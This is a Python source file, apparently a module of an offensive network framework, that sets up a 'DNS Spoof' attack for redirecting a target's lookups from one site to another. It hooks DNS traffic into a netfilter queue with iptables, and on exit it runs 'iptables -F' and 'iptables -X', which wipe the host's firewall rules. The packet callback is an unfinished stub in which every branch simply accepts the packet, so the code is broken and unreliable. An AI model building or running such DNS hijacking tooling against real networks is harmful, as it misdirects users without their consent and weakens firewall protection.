from capability import *
from scapy.all import *
import os
from netfilterqueue import NetfilterQueue

class dnsSpoof(Capability):
    prompt = Fore.RED + "DNS Spoof" + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, core):
        super(dnsSpoof, self).__init__(core)
        self.intro = GOOD + "Using DNS Spoof module..."
        self.core = core
        self.name = "DNS Spoof"
        self.options = { 
                "target":   Option("target", "10.0.0.57", "target of attack", True),
                "site":     Option("site", "www.google.com", "site to spoof", True),
                "new_site": Option("new_site", "www.bing.com", "site to send users to", True),
                }
        self.allow_modules = True
        self.modules = {}
        self.help_text = "Spoofs a certain address of a target."

    def callback(self, packet):
        payload = packet.get_payload()
        pkt = IP(payload)
        if not pkt.haslayer(DNSQR):
            packet.accept()
        else:
            if self.domain in pkt[DNS].qd.qname:
                packet.accept()
            else:
                packet.accept()

    def begin(self):
        q = NetfilterQueue()
        q.bind(1, self.callback)
        try:
            q.run() # Main loop
        except KeyboardInterrupt:
            q.unbind()
            os.system('iptables -F')
            os.system('iptables -X')


    def launch(self):
        os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
        self.domain = self.get_value("site")
        self.localIP = self.get_value("target")
        self.new_site = self.get_value("new_site")
        self.begin()
